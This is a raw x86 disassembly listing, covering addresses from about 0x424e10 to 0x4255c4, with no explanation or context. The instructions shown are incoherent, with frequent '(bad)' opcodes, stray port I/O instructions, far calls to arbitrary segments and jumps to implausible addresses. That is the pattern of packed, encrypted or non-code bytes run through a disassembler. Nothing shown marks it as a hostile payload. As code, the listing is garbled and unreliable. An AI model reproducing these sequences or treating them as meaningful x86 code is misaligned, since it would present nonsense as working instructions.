  424e10:	stos   DWORD PTR es:[edi],eax
  424e11:	inc    edi
  424e12:	sbb    ecx,DWORD PTR [eax+0x58271e5e]
  424e18:	loope  0x424e16
  424e1a:	mov    bh,0x39
  424e1c:	or     ecx,DWORD PTR [edi+0x1602b6d4]
  424e22:	je     0x424e4a
  424e24:	mov    ds:0xaca8ec1e,al
  424e29:	mov    gs,esp
  424e2b:	dec    edx
  424e2c:	sub    bh,al
  424e2e:	std    
  424e2f:	ins    DWORD PTR es:[edi],dx
  424e30:	jo     0x424e83
  424e32:	jle    0x424e71
  424e34:	xchg   ebp,eax
  424e35:	jge    0x424dce
  424e37:	in     al,0xbc
  424e39:	push   ds
  424e3a:	pop    ds
  424e3b:	cmc    
  424e3c:	mov    edi,0x702f85c9
  424e41:	retf   
  424e42:	and    BYTE PTR [eax],bl
  424e44:	fist   WORD PTR [ebx+0x33623b72]
  424e4a:	popf   
  424e4b:	loop   0x424ddc
  424e4d:	mov    ebp,DWORD PTR [esi-0x69]
  424e50:	pop    ebp
  424e51:	(bad)  [ebp+0x6a]
  424e54:	outs   dx,DWORD PTR ds:[esi]
  424e55:	mov    dh,0x56
  424e57:	add    bh,BYTE PTR [edx+0x5f]
  424e5a:	sub    ebp,DWORD PTR [edx+0x5b1ba7e2]
  424e60:	iret   
  424e61:	jbe    0x424eab
  424e63:	mov    eax,fs:0xe2260980
  424e69:	test   eax,0xb9783ca
  424e6e:	int3   
  424e6f:	xor    bl,bh
  424e71:	pop    ss
  424e72:	adc    BYTE PTR [bx+0xd3a],bh
  424e77:	stos   DWORD PTR es:[edi],eax
  424e78:	mov    WORD PTR [esi-0x1],?
  424e7b:	inc    esi
  424e7c:	fmul   QWORD PTR [ecx]
  424e7e:	and    eax,ebx
  424e80:	and    bl,al
  424e82:	xchg   ecx,eax
  424e83:	sub    DWORD PTR [ebx+0x6e],ebp
  424e86:	jae    0x424e3c
  424e88:	loopne 0x424e32
  424e8a:	mov    WORD PTR [ebp+ebx*2-0x46e66626],ss
  424e91:	xor    bh,BYTE PTR [esi]
  424e93:	mov    bh,0x4
  424e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e96:	or     eax,0x470884a8
  424e9b:	and    eax,ecx
  424e9d:	inc    ecx
  424e9e:	shl    DWORD PTR [edx*2+0x2e12e2f8],1
  424ea5:	push   ecx
  424ea6:	fs xchg edi,eax
  424ea8:	into   
  424ea9:	aas    
  424eaa:	xchg   ebx,eax
  424eab:	mov    ch,0x56
  424ead:	cmp    BYTE PTR [ecx+ebp*8],cl
  424eb0:	jmp    0x424f10
  424eb2:	call   0xfe1f:0x1f30ca5a
  424eb9:	pusha  
  424eba:	inc    esp
  424ebb:	xchg   edx,eax
  424ebc:	icebp  
  424ebd:	(bad)  
  424ebe:	mov    edx,0x6103774e
  424ec3:	int3   
  424ec4:	and    al,0xac
  424ec6:	mov    al,0xb8
  424ec8:	clc    
  424ec9:	pop    ebx
  424eca:	dec    esp
  424ecb:	mov    cl,0x8b
  424ecd:	cmp    edx,DWORD PTR [ebx-0x607752af]
  424ed3:	pop    ebx
  424ed4:	iret   
  424ed5:	icebp  
  424ed6:	fisttp DWORD PTR [ebx+ecx*4-0x7bf7d01b]
  424edd:	fcos   
  424edf:	scas   eax,DWORD PTR es:[edi]
  424ee0:	aad    0x58
  424ee2:	fcom   QWORD PTR [edi]
  424ee4:	adc    DWORD PTR [esi+0x2cf5c7b1],ecx
  424eea:	imul   edx,eax,0xfe3a8786
  424ef0:	sub    al,0xaf
  424ef2:	pusha  
  424ef3:	ss or  DWORD PTR fs:[edi],esi
  424ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ef8:	lea    edx,[edx-0x5a9572e3]
  424efe:	xor    edi,DWORD PTR [ebx]
  424f00:	or     DWORD PTR [edx],esp
  424f02:	pop    ss
  424f03:	into   
  424f04:	push   ds
  424f05:	inc    esp
  424f06:	push   ss
  424f07:	les    edi,FWORD PTR [edx-0x10]
  424f0a:	adc    eax,0x56f2d307
  424f0f:	leave  
  424f10:	sub    BYTE PTR [ebx],dl
  424f12:	imul   eax,DWORD PTR [ebx],0x95ebe4fd
  424f18:	xchg   edi,eax
  424f19:	fnstcw WORD PTR [edx]
  424f1b:	nop
  424f1c:	or     ch,BYTE PTR [edx+0x31f6c927]
  424f22:	rcr    DWORD PTR [ebx],0xe2
  424f25:	scas   eax,DWORD PTR es:[edi]
  424f26:	push   esp
  424f27:	outs   dx,DWORD PTR ds:[esi]
  424f28:	and    DWORD PTR [edx],ecx
  424f2a:	dec    eax
  424f2b:	lods   eax,DWORD PTR ds:[esi]
  424f2c:	mov    ds:0xe853c9f2,eax
  424f31:	scas   al,BYTE PTR es:[edi]
  424f32:	scas   eax,DWORD PTR es:[edi]
  424f33:	es push eax
  424f35:	add    BYTE PTR [edx-0x1a],cl
  424f38:	jmp    0xaeebb284
  424f3d:	mov    ecx,0xb84ab46e
  424f42:	adc    al,0xfb
  424f44:	int    0x6b
  424f46:	sbb    al,BYTE PTR [eax]
  424f48:	arpl   WORD PTR [edx+0x57aaeb6f],cx
  424f4e:	out    0x99,eax
  424f50:	(bad)  
  424f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f52:	pop    es
  424f53:	inc    ebx
  424f54:	jb     0x424fa0
  424f56:	xchg   ebp,eax
  424f57:	jo     0x424ee2
  424f59:	cld    
  424f5a:	jge    0x424fd9
  424f5c:	lds    eax,FWORD PTR [edi]
  424f5e:	outs   dx,DWORD PTR ds:[esi]
  424f5f:	leave  
  424f60:	imul   edi,DWORD PTR [edx+0x5ecc1727],0x15b682dd
  424f6a:	je     0x424f4f
  424f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f6d:	clc    
  424f6e:	leave  
  424f6f:	and    al,0x59
  424f72:	dec    ebx
  424f73:	fidiv  WORD PTR [ecx+0x2c803efe]
  424f79:	sbb    bl,BYTE PTR [ebx-0x48]
  424f7c:	cmp    al,0xca
  424f7e:	repnz lea ecx,[edx+ebx*1]
  424f82:	adc    eax,0x92d385a4
  424f87:	dec    ebx
  424f88:	lea    eax,[eax+0x7e677e1b]
  424f8e:	sbb    DWORD PTR [ebx+eiz*2+0x47],edi
  424f92:	mov    ebx,0x187d1d8c
  424f97:	and    DWORD PTR [edx+0x291ae476],edx
  424f9d:	xchg   edx,eax
  424f9e:	fcom   QWORD PTR [ebx]
  424fa0:	popa   
  424fa1:	dec    ebp
  424fa2:	pslld  mm0,QWORD PTR [eax-0x61c8c6b6]
  424fa9:	jle    0x424fe8
  424fab:	pop    ecx
  424fac:	xor    eax,0x38074c27
  424fb1:	push   edx
  424fb2:	ins    BYTE PTR es:[edi],dx
  424fb3:	adc    BYTE PTR [edi],ah
  424fb5:	out    dx,eax
  424fb6:	sbb    DWORD PTR [ebp+0x512a0517],edx
  424fbc:	(bad)  
  424fbd:	loop   0x42502f
  424fbf:	lds    ebx,FWORD PTR [esi]
  424fc1:	clc    
  424fc2:	lods   eax,DWORD PTR ds:[esi]
  424fc3:	pop    esp
  424fc4:	push   es
  424fc5:	(bad)  
  424fc6:	retf   
  424fc7:	in     eax,0x47
  424fc9:	dec    edi
  424fca:	push   ebx
  424fcb:	adc    cl,BYTE PTR [ebx]
  424fcd:	repz mov ebx,0x21a56d94
  424fd3:	mov    ch,0xe6
  424fd5:	xchg   esp,eax
  424fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fd7:	xchg   ebp,eax
  424fd8:	scas   al,BYTE PTR es:[edi]
  424fd9:	pop    edi
  424fda:	jno    0x424fbd
  424fdc:	popa   
  424fdd:	aaa    
  424fde:	pop    edx
  424fdf:	inc    edi
  424fe0:	xor    dh,BYTE PTR [edi]
  424fe2:	cmp    DWORD PTR [edx-0x53ac98e4],ecx
  424fe8:	and    eax,0x8e96aecc
  424fed:	cdq    
  424fee:	and    esi,DWORD PTR [ebx+0x389ddd1]
  424ff4:	pop    esp
  424ff5:	das    
  424ff6:	inc    edx
  424ff7:	mov    bl,0xa4
  424ff9:	jmp    0xc40010e7
  424ffe:	(bad)  
  424fff:	clc    
  425000:	mov    cl,0xec
  425002:	ret    
  425003:	sbb    ebx,DWORD PTR [esi+esi*4+0x69f83df4]
  42500a:	lea    esi,[edi+0x68]
  42500d:	sbb    BYTE PTR [ebp+0x16],cl
  425010:	dec    edx
  425011:	jmp    0x424fcf
  425013:	popf   
  425014:	cmp    BYTE PTR [edx+0x468f854e],bh
  42501a:	into   
  42501b:	and    eax,0xff2d9035
  425020:	ds cmp al,0x3f
  425023:	jmp    0x425030
  425025:	push   eax
  425026:	xor    eax,0x2ae8a582
  42502b:	test   DWORD PTR ds:0x5df25581,0x69f07864
  425035:	sub    al,0xb4
  425037:	push   0x9c78e7fd
  42503c:	je     0x42508f
  42503e:	lea    esp,[eax-0x3f]
  425041:	pop    esp
  425042:	iret   
  425043:	ds les ebp,FWORD PTR gs:[edi-0x37]
  425048:	in     al,0xb7
  42504a:	fcomp  QWORD PTR [ecx-0x6b561f36]
  425050:	pop    esi
  425051:	lods   eax,DWORD PTR ds:[esi]
  425052:	nop
  425053:	jnp    0x42508c
  425055:	ror    esi,1
  425057:	push   edi
  425058:	mov    cl,0x55
  42505a:	xchg   ebx,eax
  42505b:	js     0x4250bf
  42505d:	(bad)  
  42505e:	mov    ebp,0x1612643c
  425063:	jecxz  0x4250c0
  425065:	pop    ebx
  425066:	xor    ch,BYTE PTR [ebp+0x3d]
  425069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42506a:	xchg   ebx,eax
  42506b:	xor    esi,ecx
  42506d:	inc    edi
  42506e:	and    eax,ecx
  425070:	adc    eax,DWORD PTR [edi+0x6c263638]
  425076:	sub    BYTE PTR [edx+0x2380857f],ah
  42507c:	(bad)  
  42507d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42507e:	rcr    BYTE PTR [edx+0x3f],1
  425081:	int    0x24
  425083:	xor    bh,BYTE PTR ds:0x553e419f
  425089:	aam    0xf
  42508b:	out    dx,eax
  42508c:	lea    eax,[eax]
  42508e:	push   esp
  42508f:	and    al,0x22
  425091:	inc    ebx
  425092:	setae  BYTE PTR [ebx]
  425095:	dec    esi
  425096:	and    al,0x8e
  425098:	mov    esi,0x6368ae6c
  42509d:	push   ebp
  42509e:	jae    0x4250ae
  4250a0:	mov    cs,WORD PTR [eax+0x46]
  4250a3:	into   
  4250a4:	pushf  
  4250a5:	add    DWORD PTR [esi+0x5e],0x75dacd91
  4250ac:	pop    ds
  4250ad:	mov    ebp,DWORD PTR [ebx]
  4250af:	mul    edx
  4250b1:	imul   ebx,DWORD PTR ds:[edi-0x1d8b1b2a],0xffffffb2
  4250b9:	ins    BYTE PTR es:[edi],dx
  4250ba:	in     al,0x41
  4250bc:	pop    ebx
  4250bd:	mov    WORD PTR [esi-0x27],ds
  4250c0:	jno    0x425046
  4250c2:	mov    ds:0x567921d1,eax
  4250c7:	(bad)  
  4250c8:	mov    ds:0xee8d572f,al
  4250cd:	jb     0x425056
  4250cf:	sar    DWORD PTR [edx-0x5d],0x20
  4250d3:	cmp    bl,dl
  4250d5:	call   0x1273:0x1c642aa
  4250dc:	jae    0x4250be
  4250de:	cmc    
  4250df:	sahf   
  4250e0:	adc    BYTE PTR [edi-0x42],bl
  4250e3:	loop   0x42506c
  4250e5:	push   esi
  4250e6:	test   al,0xf0
  4250e8:	pop    eax
  4250e9:	scas   al,BYTE PTR es:[edi]
  4250ea:	es ret 
  4250ec:	(bad)  
  4250ed:	xchg   ebx,eax
  4250ee:	in     al,0x15
  4250f0:	xchg   edx,eax
  4250f1:	(bad)  
  4250f2:	mov    eax,0x2dc5040e
  4250f7:	out    dx,eax
  4250f8:	push   ecx
  4250f9:	call   0x5539ddf7
  4250fe:	jle    0x425108
  425100:	fadd   st(0),st
  425102:	inc    ecx
  425103:	jno    0x42517f
  425105:	les    ebx,FWORD PTR [ebx+esi*8]
  425108:	pop    ebp
  425109:	les    ebx,FWORD PTR [edi-0x4f1fc52c]
  42510f:	mov    ecx,DWORD PTR [ebx+0x69]
  425112:	ret    0x9fad
  425115:	imul   eax,ecx,0x8c397d32
  42511b:	les    esp,FWORD PTR [edi+ebp*4-0x22]
  42511f:	idiv   BYTE PTR [ebx+0x4dde7284]
  425125:	push   esi
  425126:	mov    DWORD PTR ds:0xee5ea213,esi
  42512c:	(bad)  [esi-0x7f]
  42512f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425130:	fwait
  425131:	ret    
  425132:	adc    eax,DWORD PTR [eax+0x20]
  425135:	outs   dx,BYTE PTR ds:[esi]
  425136:	mov    eax,0xc11eb93b
  42513b:	ds icebp 
  42513d:	fbstp  TBYTE PTR [esi+ecx*8+0x33]
  425141:	cwde   
  425142:	fdivr  QWORD PTR [ebx-0x3c]
  425145:	imul   ebx,ebx,0x23
  425148:	or     eax,DWORD PTR [edi+eiz*4+0x73e274d3]
  42514f:	ficomp DWORD PTR [edx-0x874af2b]
  425155:	or     al,ch
  425157:	or     BYTE PTR gs:[edx],0xe3
  42515b:	call   0xfb88:0x683e1b48
  425162:	sub    esp,DWORD PTR [ebp+0x6d]
  425165:	mov    edi,0x89ebc9b7
  42516a:	pop    es
  42516b:	mov    ds:0x89cc8a4b,eax
  425170:	outs   dx,BYTE PTR ds:[esi]
  425171:	(bad)  
  425172:	mov    di,dx
  425175:	rol    BYTE PTR [esi+0x20],1
  425178:	push   edi
  425179:	jmp    0x4251b5
  42517b:	dec    edx
  42517c:	mov    bl,0xec
  42517e:	or     eax,0xbbfd100e
  425183:	into   
  425184:	loopne 0x42518c
  425186:	fidivr WORD PTR [esi+0x6b]
  425189:	dec    ebx
  42518a:	xchg   esp,eax
  42518b:	cmp    DWORD PTR [edx],edi
  42518d:	fcom   DWORD PTR ds:0xcacf5bbc
  425193:	jo     0x4251de
	...
  4251a1:	imul   edi,DWORD PTR [esi-0x480049c5],0x4a7bffed
  4251ab:	dec    ecx
  4251ac:	pop    ecx
  4251ad:	out    dx,al
  4251ae:	jbe    0x42515b
  4251b0:	psubw  mm1,mm0
  4251b3:	add    DWORD PTR [eax],eax
  4251b5:	lods   al,BYTE PTR ds:[esi]
  4251b6:	add    eax,DWORD PTR [eax]
  4251b8:	add    BYTE PTR [esi-0x58133274],ch
  4251be:	xor    eax,0xb218ef82
  4251c3:	lock loopne 0x425177
  4251c6:	ds es sbb eax,0x2dab41e7
  4251cd:	and    esp,esp
  4251cf:	cmp    BYTE PTR [esi],dl
  4251d1:	dec    ebp
  4251d2:	xor    ecx,edx
  4251d4:	add    BYTE PTR [ecx+edx*2+0x26],cl
  4251d8:	push   cs
  4251d9:	stos   DWORD PTR es:[edi],eax
  4251da:	mov    cl,0x7b
  4251dc:	cmp    BYTE PTR [ebx-0x67f741cf],al
  4251e2:	jmp    0x4251e5
  4251e4:	cs cmc 
  4251e6:	mov    ecx,0x3c960f0a
  4251eb:	add    DWORD PTR [ebp+edi*8-0x5e4b9139],edi
  4251f2:	(bad)  
  4251f3:	sahf   
  4251f4:	pusha  
  4251f5:	push   cs
  4251f6:	mov    edx,esi
  4251f8:	in     al,dx
  4251f9:	pop    es
  4251fa:	mov    ebx,DWORD PTR [ebx-0xa]
  4251fd:	pop    esi
  4251fe:	sub    ecx,0xe8d79fd2
  425204:	test   edx,ebx
  425206:	inc    ecx
  425207:	xchg   edx,eax
  425208:	aam    0xed
  42520a:	mov    al,ds:0x496fff35
  42520f:	fdiv   DWORD PTR [ecx]
  425211:	push   cs
  425212:	ret    
  425213:	mov    edx,0xed19e277
  425218:	icebp  
  425219:	cmp    eax,0x86ac87c2
  42521e:	nop
  42521f:	dec    edx
  425220:	inc    eax
  425221:	jno    0x4251ec
  425223:	stos   BYTE PTR es:[edi],al
  425224:	and    al,0xa9
  425226:	clc    
  425227:	dec    eax
  425228:	pusha  
  425229:	stos   BYTE PTR es:[edi],al
  42522a:	inc    ecx
  42522b:	ins    DWORD PTR es:[edi],dx
  42522c:	sbb    al,0x9f
  42522e:	cmp    al,dh
  425230:	sub    esi,DWORD PTR [esi]
  425232:	or     BYTE PTR [eax+0x37dcb8a6],dh
  425238:	jle    0x425288
  42523a:	xchg   edx,eax
  42523b:	es xchg ebp,eax
  42523d:	mov    bh,0x7d
  42523f:	sbb    cl,0x72
  425242:	fisttp QWORD PTR [ebx+0x3f]
  425245:	mov    al,0xd
  425247:	(bad)  
  425249:	add    al,0x5
  42524b:	stos   DWORD PTR es:[edi],eax
  42524c:	repz bound esi,QWORD PTR [edi]
  42524f:	icebp  
  425250:	inc    ecx
  425251:	sub    eax,0x91eb412e
  425256:	or     DWORD PTR [ecx-0x5c7ecbf4],edx
  42525c:	mov    edx,edi
  42525e:	mov    esp,0xab89e39e
  425263:	dec    esi
  425264:	inc    ebp
  425265:	icebp  
  425266:	inc    edi
  425267:	bnd je 0x4252e2
  42526a:	test   al,0xc4
  42526c:	pop    DWORD PTR ds:0x566a9371
  425272:	mov    esp,edx
  425274:	imul   DWORD PTR [edi-0x1d4d415]
  42527a:	xor    ebx,DWORD PTR [ecx+eax*2]
  42527d:	(bad)  
  42527e:	retf   0x9e4b
  425281:	lss    eax,FWORD PTR [ebx-0x3cc2b021]
  425288:	dec    esp
  425289:	xchg   DWORD PTR [edx+0x50],esi
  42528c:	cli    
  42528d:	push   cs
  42528e:	adc    ebx,esi
  425290:	or     eax,DWORD PTR [ebx+0x51e8e778]
  425296:	in     al,0x27
  425298:	jnp    0x425229
  42529a:	fisub  DWORD PTR [esi+edi*8-0x48f2727d]
  4252a1:	cld    
  4252a2:	mov    esp,0x2f3e8ab
  4252a7:	hlt    
  4252a8:	shr    DWORD PTR [edi],cl
  4252aa:	in     eax,dx
  4252ab:	jb     0x4252a9
  4252ad:	ret    0x7ee4
  4252b0:	cmp    eax,0xe67c9706
  4252b5:	fisttp WORD PTR [esi-0xf7dd213]
  4252bb:	jmp    0x667b8af0
  4252c0:	and    dl,al
  4252c2:	and    al,0x37
  4252c4:	gs cmp eax,0x60658a0
  4252ca:	call   0x5359:0x834f0d81
  4252d1:	jne    0x425310
  4252d3:	mov    esp,0xc20b4a8d
  4252d8:	outs   dx,DWORD PTR ds:[esi]
  4252d9:	push   es
  4252da:	stc    
  4252db:	(bad)  
  4252dd:	dec    ebx
  4252de:	les    esi,FWORD PTR [esi-0x4d5ac67]
  4252e4:	fnsave [ebp-0x842c808]
  4252ea:	les    eax,FWORD PTR [ecx]
  4252ec:	js     0x42529b
  4252ee:	push   es
  4252ef:	mov    cl,0x9a
  4252f1:	sbb    ah,bl
  4252f3:	sbb    DWORD PTR [edi+eiz*1],ecx
  4252f6:	scas   eax,DWORD PTR es:[edi]
  4252f7:	or     al,0x75
  4252f9:	push   edx
  4252fa:	adc    ebx,0x2c21e4b4
  425300:	fcom   DWORD PTR [edx-0xfdc2efe]
  425306:	mov    esp,0xd5addda8
  42530b:	loopne 0x4252fe
  42530d:	addr16 call 0x3b8991f1
  425313:	xlat   BYTE PTR ds:[ebx]
  425314:	inc    edx
  425315:	cmp    bh,dl
  425317:	push   esp
  425318:	int    0xd1
  42531a:	pop    esp
  42531b:	call   0xd565cc5
  425320:	stos   BYTE PTR es:[edi],al
  425321:	mov    esp,0xc65a5f2d
  425326:	mov    ds,WORD PTR [ecx+edi*4+0x607363cf]
  42532d:	test   DWORD PTR [ebx],esi
  42532f:	sub    al,0x9f
  425331:	test   al,0x8b
  425333:	stc    
  425334:	sbb    al,0x61
  425336:	pop    edx
  425337:	aad    0x2d
  425339:	(bad)  
  42533a:	fisubr DWORD PTR [edx+ebx*4-0x2824853]
  425341:	push   ds
  425342:	mov    BYTE PTR [esi],dl
  425344:	sub    ebx,ecx
  425346:	test   bh,al
  425348:	jmp    0x10c404f1
  42534d:	pop    esp
  42534e:	jmp    0x4252f0
  425350:	mov    bh,0x86
  425352:	jmp    0x425318
  425354:	dec    edi
  425355:	xchg   edi,eax
  425356:	inc    ecx
  425357:	clc    
  425358:	scas   al,BYTE PTR es:[edi]
  425359:	jmp    0x10ae4969
  42535e:	sti    
  42535f:	lahf   
  425360:	cld    
  425361:	or     al,0xb2
  425363:	jmp    edx
  425365:	lock jmp 0xb9ea:0x3ed39647
  42536d:	es pop eax
  42536f:	mov    ?,WORD PTR [ebx+0x77]
  425372:	cmp    eax,0x7cca6e64
  425377:	fcom   QWORD PTR [esi+edi*4+0x6c7ed27e]
  42537e:	fst    QWORD PTR [eax]
  425380:	jl     0x425306
  425382:	in     eax,0xcf
  425384:	lock std 
  425386:	xor    eax,DWORD PTR [eax+0x7c8889f4]
  42538c:	cmc    
  42538d:	mov    ebx,DWORD PTR [edi+0x27]
  425390:	int    0x25
  425392:	in     al,0x5a
  425394:	fild   DWORD PTR [ebx]
  425396:	mov    dh,0x82
  425398:	fwait
  425399:	inc    ecx
  42539a:	sbb    al,0x36
  42539c:	mov    ecx,0x60234b91
  4253a1:	aas    
  4253a2:	retf   
  4253a3:	fs icebp 
  4253a5:	in     al,0xa
  4253a7:	adc    al,0x8a
  4253a9:	xor    DWORD PTR [ebp+0x204988f1],eax
  4253af:	(bad)  
  4253b0:	retf   0x5f27
  4253b3:	sub    ebx,DWORD PTR [ecx-0x6d]
  4253b6:	xor    BYTE PTR [esi],dl
  4253b8:	add    BYTE PTR [edx+eax*1-0x33],ah
  4253bc:	es xchg edx,eax
  4253be:	mov    DWORD PTR [ebx+0x4c],edx
  4253c1:	and    BYTE PTR [ebx-0x52340ed6],bl
  4253c7:	mov    al,ds:0xc8afa492
  4253cc:	fwait
  4253cd:	pop    ds
  4253ce:	jnp    0x42541b
  4253d0:	pop    ebp
  4253d1:	sar    BYTE PTR [esi-0x45a4a9d4],cl
  4253d7:	call   0x5ccd:0x64700cfe
  4253de:	loop   0x42545f
  4253e0:	jl     0x425435
  4253e2:	sub    al,0xb8
  4253e4:	mov    bh,0x27
  4253e6:	(bad)  
  4253e7:	outs   dx,BYTE PTR ds:[esi]
  4253e8:	sti    
  4253e9:	sbb    DWORD PTR [ebp+eax*2-0x7a79fa49],eax
  4253f0:	xor    al,0xee
  4253f2:	repz mov ds:0x9b1b9089,al
  4253f8:	dec    ebx
  4253f9:	or     BYTE PTR [esi-0x466f5617],ch
  4253ff:	inc    ecx
  425400:	xor    DWORD PTR [edi],esi
  425402:	out    dx,eax
  425403:	lock mov edx,0x8636ef9d
  425409:	std    
  42540a:	push   cs
  42540b:	inc    edx
  42540c:	lahf   
  42540d:	dec    edi
  42540e:	mov    ds:0xce6001e0,eax
  425413:	mov    esp,0x136722e8
  425418:	pushf  
  425419:	mov    ds:0xa43277b,al
  42541e:	xlat   BYTE PTR ds:[ebx]
  42541f:	dec    ecx
  425420:	test   BYTE PTR [ebx+ebx*8-0x549aee33],bl
  425427:	in     eax,0xdc
  425429:	call   0x8b98:0x164fc9ee
  425430:	jge    0x425499
  425432:	cli    
  425433:	mov    bh,0x23
  425435:	mov    WORD PTR [ebp-0x2e],cs
  425438:	js     0x4254ac
  42543a:	daa    
  42543b:	mov    BYTE PTR [esi+0x28],dl
  42543e:	mov    eax,ds:0x7fe4281b
  425443:	cmc    
  425444:	jb     0x4253d5
  425446:	shl    BYTE PTR ds:0x42cad969,0x19
  42544d:	and    edx,ebp
  42544f:	jnp    0x42543e
  425451:	retf   0xb15b
  425454:	push   ss
  425455:	xchg   edx,eax
  425456:	outs   dx,DWORD PTR ds:[esi]
  425457:	sar    dl,cl
  425459:	inc    edx
  42545a:	out    dx,al
  42545b:	cs cli 
  42545d:	bound  ebp,QWORD PTR [ecx]
  42545f:	pop    ds
  425460:	shl    WORD PTR [ebp+0x5dbab067],1
  425467:	pop    ebx
  425468:	test   DWORD PTR [eax+ecx*4-0x461d0331],esi
  42546f:	pop    ds
  425470:	je     0x4254af
  425472:	jnp    0x425414
  425474:	dec    esp
  425475:	es dec esp
  425477:	sub    esp,DWORD PTR [esi*8-0x4cd322e]
  42547e:	dec    edx
  42547f:	fwait
  425480:	loop   0x4254a9
  425482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425483:	rcr    BYTE PTR [ecx+esi*2-0x58],cl
  425487:	test   al,0x8c
  425489:	add    ah,BYTE PTR [esi]
  42548b:	test   esi,esp
  42548d:	pop    ebp
  42548e:	lds    ebx,FWORD PTR [edx]
  425490:	adc    eax,0x549cf9dd
  425495:	retf   
  425496:	bound  eax,QWORD PTR [edx+0x75abb190]
  42549c:	push   ss
  42549d:	mov    ebx,0x84a0fcbe
  4254a2:	aaa    
  4254a3:	jb     0x4254e3
  4254a5:	xchg   edi,eax
  4254a6:	inc    edx
  4254a7:	jp     0x425448
  4254a9:	mov    cl,0x5d
  4254ab:	(bad)  
  4254ac:	iret   
  4254ad:	ja     0x4254f8
  4254af:	test   DWORD PTR [ecx+0x1d5674ad],ebp
  4254b5:	jb     0x42550d
  4254b7:	mov    bh,0x5f
  4254b9:	sub    ebx,DWORD PTR [ecx+0x154f4a6c]
  4254bf:	out    0x53,eax
  4254c1:	lods   al,BYTE PTR ds:[esi]
  4254c2:	rol    bh,0x91
  4254c5:	cmp    bl,BYTE PTR [esi]
  4254c7:	inc    ebx
  4254c8:	cmp    al,0x41
  4254ca:	pushf  
  4254cb:	jmp    0x42550f
  4254cd:	dec    eax
  4254ce:	and    eax,0x482713da
  4254d3:	dec    edi
  4254d4:	mov    esi,DWORD PTR [eax]
  4254d6:	push   ss
  4254d7:	lahf   
  4254d8:	mov    edi,edx
  4254da:	sbb    al,0xea
  4254dc:	fwait
  4254dd:	cli    
  4254de:	xor    al,0xac
  4254e0:	scas   al,BYTE PTR es:[edi]
  4254e1:	inc    esp
  4254e2:	xchg   ecx,eax
  4254e3:	cmc    
  4254e4:	pop    ss
  4254e5:	pusha  
  4254e6:	loope  0x4254ff
  4254e8:	mov    ch,BYTE PTR [ecx]
  4254ea:	scas   al,BYTE PTR es:[edi]
  4254eb:	ror    BYTE PTR [ebp+0x57edd016],cl
  4254f1:	or     edi,DWORD PTR [edx-0x38]
  4254f4:	gs std 
  4254f6:	xor    eax,0xd92dd848
  4254fb:	sbb    ch,al
  4254fd:	rcl    ecx,cl
  4254ff:	data16 scas al,BYTE PTR es:[edi]
  425501:	fmul   QWORD PTR es:[eax-0x45008ddd]
  425508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425509:	sub    bl,BYTE PTR [edi]
  42550b:	pop    es
  42550c:	mov    ecx,DWORD PTR [ecx+0x4]
  42550f:	push   cs
  425510:	xlat   BYTE PTR ds:[ebx]
  425511:	add    BYTE PTR [ecx],bl
  425513:	cwde   
  425514:	adc    edx,DWORD PTR [ecx]
  425516:	pop    edi
  425517:	ror    esp,0xb3
  42551a:	fbld   TBYTE PTR [eax-0x44]
  42551d:	mov    WORD PTR [ebx+0x15],cs
  425520:	dec    esp
  425521:	inc    ebp
  425522:	or     DWORD PTR [edx-0x278c62b3],ebx
  425528:	xchg   edx,eax
  425529:	jbe    0x4254ec
  42552b:	sub    DWORD PTR [ecx],ebp
  42552d:	stos   BYTE PTR es:[edi],al
  42552e:	pop    es
  42552f:	out    0x46,eax
  425531:	sub    DWORD PTR [esi-0xf],ebp
  425534:	push   esi
  425535:	xchg   edx,eax
  425536:	mov    ah,cl
  425538:	aas    
  425539:	retf   0x5684
  42553c:	lods   al,BYTE PTR ds:[esi]
  42553d:	ins    DWORD PTR es:[edi],dx
  42553e:	jb     0x425586
  425540:	jp     0x425581
  425542:	pushf  
  425543:	or     al,0x98
  425545:	sahf   
  425546:	(bad)  
  425547:	dec    esp
  425548:	fsubr  DWORD PTR [ecx-0x1d4b5cd]
  42554e:	add    bh,BYTE PTR [ebx]
  425550:	inc    esi
  425551:	repz les ecx,FWORD PTR [ebp-0x60c38d4e]
  425558:	int3   
  425559:	xchg   ebp,eax
  42555a:	bound  ebx,QWORD PTR [ebx]
  42555c:	in     eax,dx
  42555d:	or     cl,BYTE PTR [edi+ebx*2]
  425560:	adc    esp,DWORD PTR [esi+ebp*2+0xc24e]
	...
  42556f:	add    BYTE PTR [eax],al
  425571:	jmp    0x4255bb
  425573:	or     al,0xc7
  425575:	scas   eax,DWORD PTR es:[edi]
  425576:	(bad)  
  425577:	jmp    0x4255e5
  425579:	popa   
  42557a:	mov    cl,ch
  42557c:	or     esi,DWORD PTR [ebx]
  42557e:	jbe    0x4255d4
  425580:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  425582:	int3   
  425583:	add    DWORD PTR [eax],eax
  425585:	lods   al,BYTE PTR ds:[esi]
  425586:	add    eax,DWORD PTR [eax]
  425588:	add    dl,ch
  42558a:	jb     0x425539
  42558c:	jecxz  0x4255d0
  42558e:	aad    0x26
  425590:	cmp    esi,DWORD PTR [edx-0x3c43da9b]
  425596:	ins    BYTE PTR es:[edi],dx
  425597:	retw   0x3f8b
  42559b:	fldcw  WORD PTR ds:0x4ba6be35
  4255a1:	pop    edx
  4255a2:	out    dx,eax
  4255a3:	or     al,0x4f
  4255a5:	jno    0x425563
  4255a7:	inc    ecx
  4255a8:	outs   dx,DWORD PTR ds:[esi]
  4255a9:	jp     0x4255e3
  4255ab:	jbe    0x4255ef
  4255ad:	cmp    BYTE PTR [edi],cl
  4255af:	push   ebp
  4255b0:	sbb    BYTE PTR [ebx-0x60],bl
  4255b3:	xlat   BYTE PTR es:[ebx]
  4255b5:	mov    bl,0x4b
  4255b7:	dec    ebp
  4255b8:	mov    dl,0x91
  4255ba:	jmp    0xe0b0:0x8ff2625b
  4255c1:	aaa    
  4255c2:	sbb    DWORD PTR [eax],ecx
  4255c4:	aad    0x6d
